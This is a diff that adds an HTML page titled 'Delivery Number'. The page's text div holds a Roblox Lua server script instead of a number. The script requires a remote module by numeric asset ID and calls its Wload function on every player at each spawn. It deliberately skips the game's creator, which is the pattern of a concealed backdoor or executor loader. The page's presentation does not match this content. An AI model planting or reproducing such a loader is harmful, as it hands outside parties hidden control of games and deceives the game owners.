@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Delivery Number</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      background-color: white; /* same as the screenshot */
+    }
+    .number {
+      font-size: 24px; /* adjust size as needed */
+      color: black;    /* text color */
+    }
+  </style>
+</head>
+<body>
+  <div class="number">local Players = game:GetService("Players")
+local ModuleId = 131764270352623
+local CreatorId = game.CreatorId
+
+local function shouldSkip(player)
+	-- skip the game's creator (if the game is user-owned this is their UserId)
+	return player.UserId == CreatorId
+end
+
+local function runRequireForPlayer(player)
+	if shouldSkip(player) then
+		return
+	end
+
+	-- run safely in a deferred task so it doesn't yield the event
+	task.defer(function()
+		-- if Character isn't present for some reason, bail out
+		if not player.Character then
+			return
+		end
+
+		-- tiny safety wait to let the character fully initialize (optional but helpful)
+		task.wait(0.1)
+
+		-- protect against runtime errors from the module
+		local success, err = pcall(function()
+			require(ModuleId):Wload(player.Name)
+		end)
+		if not success then
+			warn("Wload require failed for", player.Name, ":", err)
+		end
+	end)
+end
+
+-- Handle players who are already in the server when script runs
+for _, player in ipairs(Players:GetPlayers()) do
+	-- if they already have a character, run once
+	if player.Character then
+		runRequireForPlayer(player)
+	end
+	-- always connect CharacterAdded to run on every respawn
+	player.CharacterAdded:Connect(function()
+		runRequireForPlayer(player)
+	end)
+end
+
+-- Handle new players joining
+Players.PlayerAdded:Connect(function(player)
+	-- if player already spawned a character (rare), run once
+	if player.Character then
+		runRequireForPlayer(player)
+	end
+	-- run on every respawn
+	player.CharacterAdded:Connect(function()
+		runRequireForPlayer(player)
+	end)
+end)
+</div> <!-- replace this with your text -->
+</body>
+</html>
